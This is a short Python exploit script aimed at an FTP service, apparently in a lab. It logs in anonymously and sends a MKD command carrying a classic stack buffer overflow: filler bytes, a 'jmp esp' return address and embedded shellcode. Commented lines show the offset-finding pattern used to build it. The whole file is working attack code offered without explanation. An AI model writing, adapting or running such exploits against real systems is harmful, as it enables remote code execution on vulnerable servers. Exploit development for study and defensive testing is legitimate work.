#!/usr/bin/python 
import socket
import sys
shellcode = ("\xfd\x4a\x4a\x90\x98\x27\x4b\x27\xd6\x41\x98\x2f\x49\x43\x9f"
"\x92\x37\x49\x48\x2f\xd6\x49\xd6\x9b\xfd\xf8\x42\x93\x2f\x90"
"\xd9\xc2\xd9\x74\x24\xf4\x5e\xb8\x80\x24\x86\x9d\x33\xc9\xb1"
"\x53\x83\xc6\x04\x31\x46\x13\x03\xc6\x37\x64\x68\x3a\xdf\xea"
"\x93\xc2\x20\x8b\x1a\x27\x11\x8b\x79\x2c\x02\x3b\x09\x60\xaf"
"\xb0\x5f\x90\x24\xb4\x77\x97\x8d\x73\xae\x96\x0e\x2f\x92\xb9"
"\x8c\x32\xc7\x19\xac\xfc\x1a\x58\xe9\xe1\xd7\x08\xa2\x6e\x45"
"\xbc\xc7\x3b\x56\x37\x9b\xaa\xde\xa4\x6c\xcc\xcf\x7b\xe6\x97"
"\xcf\x7a\x2b\xac\x59\x64\x28\x89\x10\x1f\x9a\x65\xa3\xc9\xd2"
"\x86\x08\x34\xdb\x74\x50\x71\xdc\x66\x27\x8b\x1e\x1a\x30\x48"
"\x5c\xc0\xb5\x4a\xc6\x83\x6e\xb6\xf6\x40\xe8\x3d\xf4\x2d\x7e"
"\x19\x19\xb3\x53\x12\x25\x38\x52\xf4\xaf\x7a\x71\xd0\xf4\xd9"
"\x18\x41\x51\x8f\x25\x91\x3a\x70\x80\xda\xd7\x65\xb9\x81\xbf"
"\x4a\xf0\x39\x40\xc5\x83\x4a\x72\x4a\x38\xc4\x3e\x03\xe6\x13"
"\x40\x3e\x5e\x8b\xbf\xc1\x9f\x82\x7b\x95\xcf\xbc\xaa\x96\x9b"
"\x3c\x52\x43\x31\x34\xf5\x3c\x24\xb9\x45\xed\xe8\x11\x2e\xe7"
"\xe6\x4e\x4e\x08\x2d\xe7\xe7\xf5\xce\x16\xa4\x70\x28\x72\x44"
"\xd5\xe2\xea\xa6\x02\x3b\x8d\xd9\x60\x13\x39\x91\x62\xa4\x46"
"\x22\xa1\x82\xd0\xa9\xa6\x16\xc1\xad\xe2\x3e\x96\x3a\x78\xaf"
"\xd5\xdb\x7d\xfa\x8d\x78\xef\x61\x4d\xf6\x0c\x3e\x1a\x5f\xe2"
"\x37\xce\x4d\x5d\xee\xec\x8f\x3b\xc9\xb4\x4b\xf8\xd4\x35\x19"
"\x44\xf3\x25\xe7\x45\xbf\x11\xb7\x13\x69\xcf\x71\xca\xdb\xb9"
"\x2b\xa1\xb5\x2d\xad\x89\x05\x2b\xb2\xc7\xf3\xd3\x03\xbe\x45"
"\xec\xac\x56\x42\x95\xd0\xc6\xad\x4c\x51\xf6\xe7\xcc\xf0\x9f"
"\xa1\x85\x40\xc2\x51\x70\x86\xfb\xd1\x70\x77\xf8\xca\xf1\x72"
"\x44\x4d\xea\x0e\xd5\x38\x0c\xbc\xd6\x68")

evil = "A"*247 + "\x53\x93\x42\x7e" +shellcode + "C"*(749-len(shellcode))
#the address of jmp esp is 0x7e429353
#evil = "A" * 247 + "B"*4 + "C"*749
#evil="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('11.11.11.6',21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
